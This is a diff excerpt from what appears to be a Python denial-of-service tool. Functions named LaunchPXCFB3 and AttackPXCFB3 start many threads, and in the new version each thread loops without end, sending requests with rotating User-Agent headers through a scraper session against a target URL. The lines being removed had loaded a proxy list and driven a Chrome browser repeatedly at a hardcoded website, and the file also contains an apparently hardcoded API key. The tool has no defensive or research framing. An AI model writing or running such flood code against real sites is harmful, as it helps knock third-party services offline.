@@ -608,32 +608,40 @@ def LaunchPXCFB3(url, th, t):
     'api_key': 'ef9e368b1b69cadb030fa20473ccd0c4'
 
     })
-    proxies = open("./proxy.txt", 'r').read().split('\n')
 
     if isinstance(proxies, list) and proxies:
 
         for i in range(int(th)):
             try:
-                proxy = random.choice(proxies).strip().split(":")
-                thd = threading.Thread(target=AttackPXCFB3, args=(url, until, scraper,proxy,th))
+                thd = threading.Thread(target=AttackPXCFB3, args=(url, until, scraper,th))
                 thd.start()
                
 
             except:
-                print('teo--------------',proxy)
+                print('teo--------------')
                 pass
-def AttackPXCFB3(url, until_datetime, scraper,proxies,th):
-    try:
-        driver = webdriver.Chrome( )
-        # Define the URL you want to scrape
-        url = 'https://xvideos68.com'
-        for _ in range(50):
-            driver.get(url)
-            # Get the page title
-            page_title = driver.title
-            print(page_title)
-    except Exception as e:
-        print('falid--------------',e)
+def AttackPXCFB3(url, until_datetime, scraper,th):
+     while True:
+        try:
+             
+                headers = {
+                'User-Agent': random.choice(ua),
+
+                }
+                response = scraper.get(url,headers=headers)
+                if response.status_code == 200:
+                    # Parse the webpage content
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    
+                    # Find the title tag and get its text
+                    title = soup.title.string
+                    print(f"Title of the webpage: {title}")
+                else:
+                    print(f"Failed to retrieve the webpage. Status code: {response.status_code} ")
+                    break
+        except Exception as e:
+            print('falid',e)
+            break
              
 def LaunchPXCFB2(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
